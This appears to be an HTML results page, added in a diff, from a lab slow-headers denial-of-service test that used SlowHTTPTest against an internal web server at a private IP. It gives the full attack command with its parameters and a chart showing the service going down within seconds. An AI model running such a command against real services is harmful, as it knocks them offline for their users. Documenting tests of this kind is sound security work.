@@ -1,0 +1,330 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>W3.CSS Template</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+  <link rel="stylesheet"
+    href="https://www.w3schools.com/lib/w3-theme-black.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
+  <link rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <style>
+    html,
+    body,
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+      font-family: "Roboto", sans-serif;
+    }
+
+    .w3-sidebar {
+      z-index: 3;
+      width: 250px;
+      top: 43px;
+      bottom: 0;
+      height: inherit;
+    }
+  </style>
+
+  <style>
+
+    body { font: 12px/18px "Lucida Grande", "Lucida Sans Unicode", Helvetica, Arial, Verdana, sans-serif; background-color: transparent; color: #333; -webkit-font-smoothing: antialiased; } 
+
+    .slow_results {font-size: 12px; } 
+
+    </style>
+
+    <script type="text/javascript" src="https://www.google.com/jsapi"></script>
+
+    <script type="text/javascript">
+
+      google.load("visualization", "1", {packages:["corechart"]});
+
+      google.setOnLoadCallback(drawChart);
+
+      function drawChart() {
+
+        var data = new google.visualization.DataTable();
+
+        data.addColumn('string', 'Seconds');
+
+        data.addColumn('number', 'Closed');
+
+        data.addColumn('number', 'Pending');
+
+        data.addColumn('number', 'Connected');
+
+        data.addColumn('number', 'Service available');
+
+        data.addRows([
+
+['0',0,1,0,1000],
+
+['1',0,2,329,1000],
+
+['2',0,2,652,1000],
+
+['3',95,1,897,1000],
+
+['4',104,0,896,1000],
+
+['5',104,0,896,1000],
+
+['6',104,0,896,0],
+
+['7',104,0,896,0],
+
+['8',104,0,896,0],
+
+['9',104,0,896,0],
+
+['10',104,0,896,0],
+
+['11',104,0,896,0],
+
+['12',104,0,896,0],
+
+['13',104,0,896,0],
+
+['14',104,0,896,0],
+
+['15',104,0,896,0],
+
+['16',104,0,896,0],
+
+['17',104,0,896,0],
+
+['18',104,0,896,0],
+
+['19',104,0,896,0],
+
+['20',104,0,896,0],
+
+['21',104,0,896,0],
+
+['22',104,0,896,0],
+
+['23',104,0,896,0],
+
+['24',104,0,896,0],
+
+['25',104,0,896,0],
+
+['26',104,0,896,0],
+
+['27',104,0,896,0],
+
+['28',104,0,896,0],
+
+['29',104,0,896,0],
+
+['30',104,0,896,0],
+
+['31',104,0,896,0],
+
+['32',104,0,896,0],
+
+['33',104,0,896,0],
+
+['34',104,0,896,0],
+
+['35',104,0,896,0],
+
+['36',104,0,896,0],
+
+['37',104,0,896,0],
+
+['38',104,0,896,0],
+
+['39',104,0,896,0],
+
+['40',104,0,896,0],
+
+['41',104,0,896,0],
+
+['42',104,0,896,0],
+
+['43',104,0,896,0],
+
+['44',104,0,896,0],
+
+['45',104,0,896,0],
+
+['46',104,0,896,0],
+
+['47',104,0,896,0],
+
+['48',104,0,896,0],
+
+['49',104,0,896,0],
+
+['50',104,0,896,0],
+
+['51',104,0,896,0],
+
+['52',104,0,896,0],
+
+['53',104,0,896,0],
+
+['54',104,0,896,0],
+
+['55',104,0,896,0],
+
+['56',104,0,896,0],
+
+['57',104,0,896,0],
+
+['58',104,0,896,0],
+
+['59',104,0,896,0],
+
+['60',104,0,896,0],
+
+['61',422,0,578,0],
+
+['62',745,0,255,0],
+
+       ]);
+
+        var chart = new google.visualization.AreaChart(document.getElementById('chart_div'));
+
+        chart.draw(data, {'width': 600, 'height': 360, 'title': 'Test results against http://10.22.1.194/',         hAxis: {'title': 'Seconds', 'titleTextStyle': {color: '#FF0000'}},
+
+        vAxis: {'title': 'Connections', 'titleTextStyle': {color: '#FF0000'}, 'viewWindowMode':'maximized'}
+
+    });
+
+    }
+
+    </script>
+
+    <title>SlowHTTPTest(tm) Connection Results</title>
+
+
+</head>
+
+<body>
+
+  <!-- Navbar -->
+  <div class="w3-top">
+    <div class="w3-bar w3-theme w3-top w3-left-align w3-large">
+      <a class="w3-bar-item w3-button w3-right w3-hide-large w3-hover-white w3-large w3-theme-l1"
+        href="javascript:void(0)" onclick="w3_open()"><i
+          class="fa fa-bars"></i></a>
+      <a href="#" class="w3-bar-item w3-button w3-theme-l1">Logo</a>
+      <a href="#"
+        class="w3-bar-item w3-button w3-hide-small w3-hover-white">About</a>
+      <a href="#"
+        class="w3-bar-item w3-button w3-hide-small w3-hover-white">Values</a>
+      <a href="#"
+        class="w3-bar-item w3-button w3-hide-small w3-hover-white">News</a>
+      <a href="#"
+        class="w3-bar-item w3-button w3-hide-small w3-hover-white">Contact</a>
+      <a href="#"
+        class="w3-bar-item w3-button w3-hide-small w3-hide-medium w3-hover-white">Clients</a>
+      <a href="#"
+        class="w3-bar-item w3-button w3-hide-small w3-hide-medium w3-hover-white">Partners</a>
+    </div>
+  </div>
+
+  <!-- Sidebar -->
+  <nav
+    class="w3-sidebar w3-bar-block w3-collapse w3-large w3-theme-l5 w3-animate-left"
+    id="mySidebar">
+    <a href="javascript:void(0)" onclick="w3_close()"
+      class="w3-right w3-xlarge w3-padding-large w3-hover-black w3-hide-large"
+      title="Close Menu">
+      <i class="fa fa-remove"></i>
+    </a>
+    <iframe src="/url.html" style="height: 90vh;"></iframe>
+  </nav>
+
+  <!-- Overlay effect when opening sidebar on small screens -->
+  <div class="w3-overlay w3-hide-large" onclick="w3_close()"
+    style="cursor:pointer" title="close side menu" id="myOverlay"></div>
+
+  <!-- Main content: shift it to the right by 250 pixels when the sidebar is visible -->
+  <div class="w3-main" style="margin-left:250px">
+
+    <div class="w3-row w3-padding-64">
+        <div class="w3-twothird w3-container">
+            <h1 class="w3-text-teal">Resultados de ejecutar el ataque a servicio WEB. </h1>
+            <br>
+            <br>
+            <h2>Comando ejecutado</h2>
+            <li>
+              slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 500 -t GET -u http://10.22.1.194/ -x 150 -p 3
+            </li>
+            
+            <br>
+            <br>
+            
+           
+              
+           
+              <p><table class='slow_results' border='0'><tr><th>Test parameters</th></tr><tr><td><b>Test type</b></td><td>SLOW HEADERS</td></tr><tr><td><b>Number of connections</b></td><td>1000</td></tr><tr><td><b>Verb</b></td><td>GET</td></tr><tr><td><b>Content-Length header value</b></td><td>4096</td></tr><tr><td><b>Cookie</b></td><td></td></tr><tr><td><b>Extra data max length</b></td><td>304</td></tr><tr><td><b>Interval between follow up data</b></td><td>10 seconds</td></tr><tr><td><b>Connections per seconds</b></td><td>500</td></tr><tr><td><b>Timeout for probe connection</b></td><td>3</td></tr><tr><td><b>Target test duration</b></td><td>240 seconds</td></tr><tr><td><b>Using proxy</b></td><td>no proxy  </td></tr></table></p>
+           
+                <div id="chart_div"></div>
+        </div>
+        <div class="w3-third w3-container">
+            <p class="w3-border w3-padding-large w3-padding-32 w3-center">AD</p>
+            <p class="w3-border w3-padding-large w3-padding-64 w3-center">AD</p>
+        </div>
+    </div>
+
+
+
+
+
+        
+        </div>
+
+      <footer id="myFooter">
+        <div class="w3-container w3-theme-l2 w3-padding-32">
+          <h4>Footer</h4>
+        </div>
+
+        <div class="w3-container w3-theme-l1">
+          <p>Powered by <a href="https://www.w3schools.com/w3css/default.asp"
+              target="_blank">w3.css</a></p>
+        </div>
+      </footer>
+
+      <!-- END MAIN -->
+    </div>
+  </div>
+
+  <script>
+    // Get the Sidebar
+    var mySidebar = document.getElementById("mySidebar");
+
+    // Get the DIV with overlay effect
+    var overlayBg = document.getElementById("myOverlay");
+
+    // Toggle between showing and hiding the sidebar, and add overlay effect
+    function w3_open() {
+      if (mySidebar.style.display === 'block') {
+        mySidebar.style.display = 'none';
+        overlayBg.style.display = "none";
+      } else {
+        mySidebar.style.display = 'block';
+        overlayBg.style.display = "block";
+      }
+    }
+
+    // Close the sidebar with the close button
+    function w3_close() {
+      mySidebar.style.display = "none";
+      overlayBg.style.display = "none";
+    }
+  </script>
+
+</body>
+
